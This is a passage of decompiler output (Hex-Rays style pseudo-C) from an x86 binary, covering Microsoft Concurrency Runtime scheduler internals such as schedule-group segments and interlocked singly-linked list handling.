  struct _SINGLE_LIST_ENTRY *v5; // esi
  struct _SINGLE_LIST_ENTRY *v6; // esi
  int result; // eax
  struct _SINGLE_LIST_ENTRY *v8; // [esp-Ch] [ebp-2Ch]
  int v9; // [esp-4h] [ebp-24h]
  int v10[2]; // [esp+Ch] [ebp-14h] BYREF
  struct _SINGLE_LIST_ENTRY *v11; // [esp+14h] [ebp-Ch]
  int v12; // [esp+18h] [ebp-8h]
  struct _SINGLE_LIST_ENTRY *v13; // [esp+1Ch] [ebp-4h]

  v12 = 0;
  v13 = this;
  UserMathErrorFunction();
  Next = this[2].Next;
  v3 = ((int (__thiscall *)(struct _SINGLE_LIST_ENTRY *))this[7].Next->Next[1].Next)(this[7].Next);
  v9 = (int)Next;
  v4 = v13;
  sub_453A71(5, 4u, v3, v9);
  if ( BYTE1(v13[39].Next[43].Next) )
  {
    sub_4592C3(v13 - 1, 2);
    goto LABEL_19;
  }
  v5 = v13[39].Next;
  v8 = v13[6].Next;
  v10[0] = 0;
  v11 = 0;
  if ( !((unsigned int (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int *, struct _SINGLE_LIST_ENTRY *, _DWORD, int))v5[19].Next)(
          &v5[10],
          v10,
          v8,
          0,
          9) )
    goto LABEL_18;
  if ( v10[0] == 1 )
    goto LABEL_12;
  UserMathErrorFunction();
  v6 = (struct _SINGLE_LIST_ENTRY *)sub_450810((int)v4[7].Next, 1);
  v13 = v6;
  UserMathErrorFunction();
  if ( v6 )
  {
    if ( sub_45D165(v10) )
    {
LABEL_10:
      sub_45CB42(v10, (int)v6);
LABEL_14:
      sub_4593FA((int)&v4[-1], (int)v6, 2);
      goto LABEL_19;
    }
    if ( ((unsigned int (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int *, struct _SINGLE_LIST_ENTRY *, _DWORD, int))v4[39].Next[19].Next)(
           &v4[39].Next[10],
           v10,
           v4[6].Next,
           0,
           3) )
    {
      if ( v10[0] != 1 )
      {
        v6 = v13;
        goto LABEL_10;
      }
      sub_451A84((int)v4[7].Next, v13, 1);
LABEL_12:
      v6 = v11;
      goto LABEL_13;
    }
    sub_451A84((int)v4[7].Next, v13, 1);
    v6 = 0;
  }
  else
  {
    if ( !((unsigned int (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int *, struct _SINGLE_LIST_ENTRY *, _DWORD, int))v4[39].Next[19].Next)(
            &v4[39].Next[10],
            v10,
            v4[6].Next,
            0,
            1) )
      goto LABEL_18;
    v6 = (struct _SINGLE_LIST_ENTRY *)sub_45CAF5(v10);
  }
LABEL_13:
  if ( v6 )
    goto LABEL_14;
LABEL_18:
  LOBYTE(v12) = 1;
LABEL_19:
  result = UserMathErrorFunction();
  if ( (_BYTE)v12 )
    return ((int (__thiscall *)(struct _SINGLE_LIST_ENTRY *))v4[38].Next->Next[3].Next)(v4[38].Next);
  return result;
}

//----- (004598ED) --------------------------------------------------------
union _SLIST_HEADER *__thiscall sub_4598ED(union _SLIST_HEADER *this, int a2, struct _SINGLE_LIST_ENTRY *a3)
{
  char *v4; // ecx
  int v6[7]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  v6[4] = (int)this;
  *(_DWORD *)&this->Depth = 0;
  this[1].Next.Next = 0;
  this->Next.Next = (struct _SINGLE_LIST_ENTRY *)a2;
  sub_44EE4A(this + 2, a2, 256, 64);
  v7 = 0;
  sub_44EE4A(this + 12, a2, 256, 64);
  this[23].Next.Next = a3;
  this[22].Next.Next = 0;
  *(_DWORD *)&this[22].Depth = 0;
  *(_DWORD *)&this[23].Depth = 0;
  memset(v6, 0, 16);
  v4 = *(char **)(a2 + 176);
  LOBYTE(v7) = 1;
  this[1].Next.Next = (struct _SINGLE_LIST_ENTRY *)sub_45A3C3(v4, v6, (int)this);
  return this;
}

//----- (00459976) --------------------------------------------------------
void __thiscall sub_459976(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // esi
  struct _SINGLE_LIST_ENTRY *v3; // ecx
  PSLIST_ENTRY v4; // esi
  struct _SINGLE_LIST_ENTRY *v5; // ecx
  struct _SINGLE_LIST_ENTRY *Next; // esi
  struct _SINGLE_LIST_ENTRY *v7; // eax
  struct _SINGLE_LIST_ENTRY *v8; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v10; // esi

  v2 = InterlockedFlushSList(ListHead);
  while ( v2 )
  {
    v3 = v2 - 72;
    v2 = v2->Next;
    sub_456E54(v3);
  }
  v4 = InterlockedFlushSList(ListHead + 1);
  while ( v4 )
  {
    v5 = v4 - 72;
    v4 = v4->Next;
    sub_456E54(v5);
  }
  Next = ListHead[2].Next.Next;
  while ( Next )
  {
    v7 = Next - 72;
    Next = Next->Next;
    sub_456E54(v7);
  }
  v8 = ListHead[6].Next.Next;
  if ( v8 )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_456E54(v8->Next[i].Next);
      v10 = v8[1].Next;
      j_j__free(v8->Next);
      sub_44775B(v8);
      v8 = v10;
    }
    while ( v10 );
  }
  j_j__free(*(void **)&ListHead[6].Depth);
}

//----- (00459A19) --------------------------------------------------------
void __thiscall sub_459A19(union _SLIST_HEADER *this)
{
  this[1].Next.Next = 0;
  sub_459976(this + 12);
  sub_459976(this + 2);
}

//----- (00459A31) --------------------------------------------------------
volatile __int32 *__thiscall sub_459A31(volatile __int32 *this)
{
  volatile __int32 *result; // eax

  result = this + 47;
  _InterlockedExchange(this + 47, 1);
  return result;
}

//----- (00459A72) --------------------------------------------------------
char __cdecl sub_459A72(int a1)
{
  char result; // al
  _DWORD *v2; // esi
  int (__thiscall ***v3)(_DWORD, int); // eax

  result = sub_450C9C(*(_DWORD **)(a1 + 36));
  if ( !result )
  {
    v2 = *(_DWORD **)(a1 + 16);
    while ( v2 )
    {
      v3 = (int (__thiscall ***)(_DWORD, int))(v2 - 72);
      v2 = (_DWORD *)*v2;
      sub_456E54(v3);
    }
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (00459A7E) --------------------------------------------------------
char __thiscall sub_459A7E(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4)
{
  int v5; // edx
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // edx
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( (struct _SINGLE_LIST_ENTRY *)_InterlockedCompareExchange(
                                      (volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6),
                                      0,
                                      (signed __int32)a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = a2 + 72;
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && !sub_450C9C(*(_DWORD **)&ListHead[4].Depth)
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_451340(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_459A72,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (00459B72) --------------------------------------------------------
char __thiscall sub_459B72(char *this, int a2)
{
  return sub_459A7E(
           (PSLIST_HEADER)&this[((*(_DWORD *)(a2 + 12) & 0xFFFFFFF) != 0 ? 0xFFFFFFB0 : 0) + 96],
           (struct _SINGLE_LIST_ENTRY *)a2,
           *(_DWORD *)(a2 + 248),
           1);
}

//----- (00459BA1) --------------------------------------------------------
int *__thiscall sub_459BA1(int *this, int a2, int a3, char a4, unsigned int a5)
{
  int v6; // ebx
  _DWORD *v7; // edi
  _DWORD *v8; // eax

  v6 = (int)(this + 1);
  v7 = 0;
  *this = a2;
  this[1] = 0;
  this[2] = 0;
  this[3] = a5;
  this[4] = 0;
  this[5] = 0;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  sub_45A7B3(this, (int)(this + 1));
  if ( !a4 )
  {
    v8 = operator new(0x2Cu);
    if ( v8 )
      v7 = sub_459D32(v8, *this, v6, a5, 0);
    this[4] = (int)v7;
    this[5] = (int)v7;
  }
  return this;
}

//----- (00459C18) --------------------------------------------------------
int __thiscall sub_459C18(int this, int a2, _DWORD *a3)
{
  *(_DWORD *)this = &Concurrency::details::ScheduleGroupBase::`vftable';
  *(_DWORD *)(this + 4) = a2;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 0;
  *(_DWORD *)(this + 32) = 0;
  *(_DWORD *)(this + 36) = 0;
  *(_DWORD *)(this + 40) = 0;
  *(_DWORD *)(this + 44) = 0;
  sub_45A7DC((int *)this, a3);
  *(_DWORD *)(this + 28) = sub_450940(*(volatile signed __int32 **)(this + 4));
  return this;
}
// 494324: using guessed type void *Concurrency::details::ScheduleGroupBase::`vftable';

//----- (00459C71) --------------------------------------------------------
_DWORD *__thiscall sub_459C71(_DWORD *this, int a2, int a3, _DWORD *a4)
{
  _DWORD *v5; // eax
  int v7; // [esp-10h] [ebp-38h]
  int v8; // [esp-Ch] [ebp-34h]
  void *v9[5]; // [esp+10h] [ebp-18h] BYREF
  int v10; // [esp+24h] [ebp-4h]

  v9[2] = this;
  *this = &Concurrency::details::ScheduleGroupSegmentBase::`vftable';
  this[3] = 0;
  this[4] = 0;
  this[5] = 0;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  this[10] = 0;
  this[11] = this + 10;
  this[12] = 0;
  v10 = 0;
  v5 = sub_45065D(*(unsigned int **)(a2 + 4), v9, this + 3);
  v7 = *(_DWORD *)(a2 + 4);
  LOBYTE(v10) = 1;
  sub_459BA1(this + 13, v7, (int)v5, 0, 0x40u);
  LOBYTE(v10) = 3;
  j_j__free(v9[1]);
  sub_44EE4A((PSLIST_HEADER)this + 11, *(_DWORD *)(a2 + 4), 256, 64);
  v8 = *(_DWORD *)(a2 + 4);
  LOBYTE(v10) = 4;
  sub_44EE4A((PSLIST_HEADER)this + 21, v8, 256, 0x7FFFFFFF);
  this[66] = 0;
  this[67] = 0;
  LOBYTE(v10) = 5;
  sub_45A7EF((int)this, a2, a3, a4);
  return this;
}
// 494310: using guessed type void *Concurrency::details::ScheduleGroupSegmentBase::`vftable';

//----- (00459D32) --------------------------------------------------------
_DWORD *__thiscall sub_459D32(_DWORD *this, int a2, int a3, unsigned int a4, int a5)
{
  _DWORD *v6; // ecx
  void *v7; // eax

  v6 = this + 1;
  *this = a2;
  *v6 = 0;
  v6[1] = 0;
  sub_44FFD9((int)v6, a3);
  this[4] = a5;
  this[5] = 0;
  this[6] = 0;
  v7 = (void *)unknown_libname_86((unsigned __int64)a4 >> 30 != 0 ? -1 : 4 * a4);
  this[3] = v7;
  memset(v7, 0, 4 * a4);
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00459D9E) --------------------------------------------------------
void __thiscall sub_459D9E(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // esi
  struct _SINGLE_LIST_ENTRY *v3; // ecx
  PSLIST_ENTRY v4; // esi
  struct _SINGLE_LIST_ENTRY *v5; // ecx
  struct _SINGLE_LIST_ENTRY *Next; // esi
  struct _SINGLE_LIST_ENTRY *v7; // eax
  struct _SINGLE_LIST_ENTRY *v8; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v10; // esi

  v2 = InterlockedFlushSList(ListHead);
  while ( v2 )
  {
    v3 = v2 - 1;
    v2 = v2->Next;
    sub_44775B(v3);
  }
  v4 = InterlockedFlushSList(ListHead + 1);
  while ( v4 )
  {
    v5 = v4 - 1;
    v4 = v4->Next;
    sub_44775B(v5);
  }
  Next = ListHead[2].Next.Next;
  while ( Next )
  {
    v7 = Next - 1;
    Next = Next->Next;
    sub_44775B(v7);
  }
  v8 = ListHead[6].Next.Next;
  if ( v8 )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_44775B(v8->Next[i].Next);
      v10 = v8[1].Next;
      j_j__free(v8->Next);
      sub_44775B(v8);
      v8 = v10;
    }
    while ( v10 );
  }
  j_j__free(*(void **)&ListHead[6].Depth);
}

//----- (00459E44) --------------------------------------------------------
void __thiscall sub_459E44(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // eax
  PSLIST_ENTRY v3; // eax
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int i; // esi
  void **p_Next; // ecx
  struct _SINGLE_LIST_ENTRY *v7; // esi

  v2 = InterlockedFlushSList(ListHead);
  sub_4531D6(v2);
  v3 = InterlockedFlushSList(ListHead + 1);
  sub_4531D6(v3);
  sub_4531D6(&ListHead[2].Next.Next->Next);
  Next = ListHead[6].Next.Next;
  if ( Next )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
      {
        p_Next = (void **)&Next->Next[i].Next->Next;
        if ( p_Next )
          sub_452CD5(p_Next, 1);
      }
      v7 = Next[1].Next;
      j_j__free(Next->Next);
      sub_44775B(Next);
      Next = v7;
    }
    while ( v7 );
  }
  j_j__free(*(void **)&ListHead[6].Depth);
}

//----- (00459EC0) --------------------------------------------------------
void __thiscall sub_459EC0(int this)
{
  int v2; // ecx
  int v3; // edi
  unsigned int v4; // eax

  v2 = *(_DWORD *)(this + 20);
  if ( v2 )
  {
    do
    {
      v3 = *(_DWORD *)(v2 + 24);
      if ( v2 == *(_DWORD *)(this + 16) )
        v4 = *(_DWORD *)(this + 28) - *(_DWORD *)(v2 + 16);
      else
        v4 = *(_DWORD *)(this + 12);
      sub_45ADBD(v2, v4);
      v2 = v3;
    }
    while ( v3 );
  }
  j_j__free(*(void **)(this + 8));
}

//----- (00459F24) --------------------------------------------------------
void __thiscall sub_459F24(signed __int32 this)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 12) & 0xFFFFFFF;
  *(_DWORD *)this = &Concurrency::details::ScheduleGroupSegmentBase::`vftable';
  if ( v2 == 3 )
    sub_45A39E(*(_DWORD **)(*(_DWORD *)(this + 256) + 4), *(_DWORD *)(this + 36), this);
  sub_459D9E((PSLIST_HEADER)(this + 168));
  sub_459E44((PSLIST_HEADER)(this + 88));
  sub_459EC0(this + 52);
  j_j__free(*(void **)(this + 32));
}
// 494310: using guessed type void *Concurrency::details::ScheduleGroupSegmentBase::`vftable';

//----- (00459F72) --------------------------------------------------------
void **__thiscall sub_459F72(void **this, void **a2)
{
  void **result; // eax

  j_j__free(this[1]);
  *this = *a2;
  this[1] = a2[1];
  result = this;
  *a2 = 0;
  a2[1] = 0;
  return result;
}

//----- (00459F9C) --------------------------------------------------------
void *__thiscall sub_459F9C(void *Block, char a2)
{
  sub_459F24((signed __int32)Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00459FC1) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_459FC1(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  volatile signed __int32 *v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  signed __int32 v6; // edx
  signed __int32 v7; // eax
  char v8; // al
  volatile __int32 *v9; // edi
  void *v10; // eax
  int *v11; // ecx
  int v12; // eax
  int v13; // edx
  size_t v15; // [esp-8h] [ebp-38h]
  char v16[8]; // [esp+Ch] [ebp-24h] BYREF
  int v17; // [esp+14h] [ebp-1Ch]
  int (*v18)(); // [esp+18h] [ebp-18h]
  int v19; // [esp+1Ch] [ebp-14h]
  volatile signed __int32 *v20; // [esp+20h] [ebp-10h]
  _DWORD *v21; // [esp+24h] [ebp-Ch]
  volatile signed __int32 *v22; // [esp+28h] [ebp-8h]
  char v23; // [esp+2Fh] [ebp-1h]

  v2 = this;
  v23 = 0;
  v21 = this;
  v3 = 0;
  v4 = this[12];
  do
  {
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v5 = *(volatile signed __int32 **)v4;
    v6 = 0;
    v22 = *(volatile signed __int32 **)v4;
    if ( (int)v2[10] <= 0 )
    {
LABEL_8:
      v8 = v23;
      if ( v23 )
        goto LABEL_25;
LABEL_9:
      _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -2, -1);
      v22 = (volatile signed __int32 *)((char *)v3 + v2[10]);
      v9 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v9, 1, 0) )
      {
        v10 = (void *)unknown_libname_86((unsigned __int64)(unsigned int)v2[10] >> 30 != 0 ? -1 : 4 * v2[10]);
        v15 = 4 * v2[10];
        v19 = (int)v10;
        memset(v10, 0, v15);
        v11 = (int *)operator new(0xCu);
        v20 = v11;
        if ( v11 )
        {
          v12 = v19;
          v11[1] = 0;
          v11[2] = -1;
          *v11 = v12;
        }
        else
        {
          v11 = 0;
        }
        v13 = v2[15];
        if ( v13 < v2[14] )
        {
          *(_DWORD *)(v2[13] + 4 * v13) = v11;
          ++v2[15];
        }
        _InterlockedExchange(v9, (__int32)v11);
      }
      if ( *v9 == 1 )
      {
        v17 = 0;
        v18 = sub_44AE9C;
        do
          sub_449592((int)v16);
        while ( *v9 == 1 );
      }
      v3 = v22;
      goto LABEL_24;
    }
    while ( *v5 )
    {
LABEL_7:
      ++v6;
      v22 = ++v5;
      if ( v6 >= v2[10] )
        goto LABEL_8;
    }
    v20 = (volatile signed __int32 *)((char *)v3 + v6);
    *a2 = (char *)v3 + v6;
    v19 = v2[16];
    v7 = _InterlockedCompareExchange(v22, (signed __int32)a2, 0);
    v2 = v21;
    if ( v7 )
    {
      v5 = v22;
      goto LABEL_7;
    }
    v3 = v20;
    v23 = 1;
    if ( (int)v20 >= v19 )
      _InterlockedIncrement(v21 + 16);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v6);
LABEL_24:
    v8 = v23;
LABEL_25:
    v4 = *(_DWORD *)(v4 + 4);
  }
  while ( !v8 );
  return v3;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 459FC1: using guessed type char var_24[8];

//----- (0045A11C) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_45A11C(_DWORD *this, signed __int32 a2)
{
  _DWORD *v2; // esi
  volatile signed __int32 *v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  signed __int32 v6; // edx
  signed __int32 v7; // eax
  char v8; // al
  volatile __int32 *v9; // edi
  void *v10; // eax
  int *v11; // ecx
  int v12; // eax
  int v13; // edx
  size_t v15; // [esp-8h] [ebp-38h]
  char v16[8]; // [esp+Ch] [ebp-24h] BYREF
  int v17; // [esp+14h] [ebp-1Ch]
  int (*v18)(); // [esp+18h] [ebp-18h]
  int v19; // [esp+1Ch] [ebp-14h]
  volatile signed __int32 *v20; // [esp+20h] [ebp-10h]
  _DWORD *v21; // [esp+24h] [ebp-Ch]
  volatile signed __int32 *v22; // [esp+28h] [ebp-8h]
  char v23; // [esp+2Fh] [ebp-1h]

  v2 = this;
  v23 = 0;
  v21 = this;
  v3 = 0;
  v4 = this[12];
  do
  {
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v5 = *(volatile signed __int32 **)v4;
    v6 = 0;
    v22 = *(volatile signed __int32 **)v4;
    if ( (int)v2[10] <= 0 )
    {
LABEL_8:
      v8 = v23;
      if ( v23 )
        goto LABEL_25;
LABEL_9:
      _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -2, -1);
      v22 = (volatile signed __int32 *)((char *)v3 + v2[10]);
      v9 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v9, 1, 0) )
      {
        v10 = (void *)unknown_libname_86((unsigned __int64)(unsigned int)v2[10] >> 30 != 0 ? -1 : 4 * v2[10]);
        v15 = 4 * v2[10];
        v19 = (int)v10;
        memset(v10, 0, v15);
        v11 = (int *)operator new(0xCu);
        v20 = v11;
        if ( v11 )
        {
          v12 = v19;
          v11[1] = 0;
          v11[2] = -1;
          *v11 = v12;
        }
        else
        {
          v11 = 0;
        }
        v13 = v2[15];
        if ( v13 < v2[14] )
        {
          *(_DWORD *)(v2[13] + 4 * v13) = v11;
          ++v2[15];
        }
        _InterlockedExchange(v9, (__int32)v11);
      }
      if ( *v9 == 1 )
      {
        v17 = 0;
        v18 = sub_44AE9C;
        do
          sub_449592((int)v16);
        while ( *v9 == 1 );
      }
      v3 = v22;
      goto LABEL_24;
    }
    while ( *v5 )
    {
LABEL_7:
      ++v6;
      v22 = ++v5;
      if ( v6 >= v2[10] )
        goto LABEL_8;
    }
    v20 = (volatile signed __int32 *)((char *)v3 + v6);
    *(_DWORD *)(a2 + 248) = (char *)v3 + v6;
    v19 = v2[16];
    v7 = _InterlockedCompareExchange(v22, a2, 0);
    v2 = v21;
    if ( v7 )
    {
      v5 = v22;
      goto LABEL_7;
    }
    v3 = v20;
    v23 = 1;
    if ( (int)v20 >= v19 )
      _InterlockedIncrement(v21 + 16);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v6);
LABEL_24:
    v8 = v23;
LABEL_25:
    v4 = *(_DWORD *)(v4 + 4);
  }
  while ( !v8 );
  return v3;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 45A11C: using guessed type char var_24[8];

//----- (0045A27B) --------------------------------------------------------
int __thiscall sub_45A27B(_DWORD *this, int a2, int a3, int a4, int a5, int a6)
{
  _DWORD *v7; // eax
  int v8; // ebx
  unsigned __int8 (__thiscall *v9)(int, int, int, int, int, int); // esi
  int result; // eax
  int v11; // [esp-14h] [ebp-34h] BYREF
  int v12; // [esp-10h] [ebp-30h] BYREF
  int v13; // [esp-Ch] [ebp-2Ch]
  int v14; // [esp-8h] [ebp-28h]
  int v15; // [esp-4h] [ebp-24h]
  int v16[5]; // [esp+Ch] [ebp-14h] BYREF

  v7 = sub_4501C0();
  if ( !v7 || (_DWORD *)sub_44CC5D(v7) != this )
    *(_DWORD *)(a2 + 228) = 1;
  v8 = *(_DWORD *)(this[64] + 4);
  if ( *(int *)(v8 + 440) <= 0
    || (v9 = *(unsigned __int8 (__thiscall **)(int, int, int, int, int, int))(*(_DWORD *)v8 + 60),
        sub_452901(&v12, &a3),
        !v9(v8, a2, v12, v13, v14, v15)) )
  {
    (*(void (__thiscall **)(_DWORD *, int))(*this + 8))(this, a2);
    if ( (this[3] & 0xFFFFFFF) != 0 && sub_452C38(&a3, this + 3) )
      (*(void (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( *(int *)(v8 + 436) > 0 )
    {
      sub_452901(v16, &a3);
      v15 = 11;
      sub_452901(&v11, v16);
      sub_4521A6((unsigned int *)v8, (int)this, v11, v12, v13, v14, v15);
    }
  }
  result = a2;
  *(_DWORD *)(a2 + 228) = 0;
  return result;
}
// 45A27B: using guessed type int var_14[5];

//----- (0045A392) --------------------------------------------------------
char __cdecl sub_45A392(int a1)
{
  char result; // al
  _DWORD *v2; // esi
  _DWORD *v3; // eax

  result = sub_450C9C(*(_DWORD **)(a1 + 36));
  if ( !result )
  {
    v2 = *(_DWORD **)(a1 + 16);
    while ( v2 )
    {
      v3 = v2 - 1;
      v2 = (_DWORD *)*v2;
      sub_44775B(v3);
    }
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (0045A39E) --------------------------------------------------------
signed __int32 __thiscall sub_45A39E(_DWORD *this, int a2, signed __int32 a3)
{
  signed __int32 result; // eax

  result = a3;
  if ( *(_DWORD *)((a2 << 7) + this[23]) == a3 )
    return _InterlockedCompareExchange((volatile signed __int32 *)((a2 << 7) + this[23]), 0, a3);
  return result;
}

//----- (0045A3C3) --------------------------------------------------------
int __thiscall sub_45A3C3(char *this, _DWORD *a2, int a3)
{
  int v3; // eax
  int *v4; // ebx
  bool v5; // zf
  union _SLIST_HEADER *v6; // eax
  PSLIST_ENTRY v7; // eax
  int v8; // esi

  v3 = *a2 & 0xFFFFFFF;
  v4 = (int *)&this[4 * (v3 == 0) + 12];
  v5 = v3 == 0;
  v6 = (union _SLIST_HEADER *)(a3 + 96);
  if ( !v5 )
    v6 = (union _SLIST_HEADER *)(a3 + 16);
  v7 = InterlockedPopEntrySList(v6);
  if ( !v7 || (v8 = (int)&v7[-72], v7 == (PSLIST_ENTRY)288) )
    v8 = (*(int (__thiscall **)(char *, int, _DWORD *))(*(_DWORD *)this + 32))(this, a3, a2);
  else
    sub_45A7EF(v8, (int)this, a3, a2);
  *(_DWORD *)(v8 + 260) = *v4;
  *v4 = v8;
  if ( !*(_DWORD *)(a3 + 188) )
    sub_459A31((volatile __int32 *)a3);
  sub_45A11C((_DWORD *)(a3 + ((*a2 & 0xFFFFFFF) != 0 ? 16 : 96)), v8);
  return v8;
}

//----- (0045A474) --------------------------------------------------------
void __thiscall sub_45A474(_DWORD *this)
{
  volatile signed __int32 *v2; // edi
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  char v5[8]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+18h] [ebp-18h]
  void (*v7)(); // [esp+1Ch] [ebp-14h]
  void *Block; // [esp+20h] [ebp-10h]
  int v9; // [esp+2Ch] [ebp-4h]

  v2 = this + 4;
  if ( !this[4] && !_InterlockedCompareExchange(v2, 1, 0) )
  {
    v3 = operator new(0x2Cu);
    Block = v3;
    v9 = 0;
    if ( v3 )
      v4 = sub_459D32(v3, *this, (int)(this + 1), this[3], 0);
    else
      v4 = 0;
    v9 = -1;
    *v2 = (volatile signed __int32)v4;
    this[5] = v4;
  }
  if ( !this[5] )
  {
    v6 = 0;
    v7 = sub_44AE5E;
    do
      sub_449592((int)v5);
    while ( !this[5] );
  }
}
// 45A474: using guessed type char var_20[8];

//----- (0045A4EA) --------------------------------------------------------
char __thiscall sub_45A4EA(volatile signed __int32 *this, _DWORD *a2)
{
  int v2; // ebx
  volatile signed __int32 *v3; // edx
  unsigned __int32 i; // esi
  signed __int32 v5; // eax
  _DWORD *v6; // ecx
  signed __int32 *v7; // eax
  signed __int32 v8; // edx
  _DWORD *v9; // edi
  int v10; // eax
  int v11; // esi
  char v12; // al
  int v14[2]; // [esp+Ch] [ebp-18h] BYREF
  volatile signed __int32 *v15; // [esp+14h] [ebp-10h]
  volatile signed __int32 *v16; // [esp+18h] [ebp-Ch]
  int v17; // [esp+1Ch] [ebp-8h]
  _DWORD *v18; // [esp+20h] [ebp-4h]

  v2 = (int)this;
  v15 = this;
  v3 = this + 6;
LABEL_2:
  for ( i = *v3; i != *(_DWORD *)(v2 + 28); i = v5 )
  {
    v5 = _InterlockedCompareExchange(v3, i + 1, i);
    if ( v5 == i )
    {
      v6 = sub_45A886((int *)v2, i, 0);
      v7 = (signed __int32 *)(v2 + 20);
      v18 = v6;
      v16 = (volatile signed __int32 *)(v2 + 20);
      if ( v6 != *(_DWORD **)(v2 + 20) )
      {
        v8 = *v7;
        v9 = (_DWORD *)*v7;
        while ( 1 )
        {
          while ( !(*(_DWORD *)(v2 + 12) + v9[5]) )
            v9 = (_DWORD *)v9[6];
          if ( v9[4] <= *(_DWORD *)(v8 + 16) )
            break;
          v10 = _InterlockedCompareExchange(v16, (signed __int32)v9, v8);
          v2 = (int)v15;
          v17 = v10;
          if ( v10 == v8 )
          {
            while ( (_DWORD *)v10 != v9 )
            {
              sub_45ADBD(v10, *(_DWORD *)(v2 + 12));
              v10 = *(_DWORD *)(v17 + 24);
              v17 = v10;
            }
            break;
          }
          v9 = (_DWORD *)v10;
          v8 = v10;
        }
        v6 = v18;
      }
      v11 = i - v6[4];
      v14[0] = (int)v6;
      v14[1] = v11;
      v12 = sub_453082(v14, a2);
      v3 = (volatile signed __int32 *)(v2 + 24);
      if ( v12 )
        return 1;
      goto LABEL_2;
    }
  }
  return 0;
}

//----- (0045A5AC) --------------------------------------------------------
int __thiscall sub_45A5AC(int *this)
{
  _DWORD *v2; // esi
  int v3; // edi

  v2 = this + 2;
  sub_44AE12(this + 2);
  v3 = sub_4500E5(this);
  sub_44AE53(v2);
  return v3;
}

//----- (0045A5E0) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_45A5E0(_DWORD *this, int a2)
{
  int v3; // eax

  v3 = this[64];
  if ( (*(_BYTE *)(v3 + 48) & 4) == 0 )
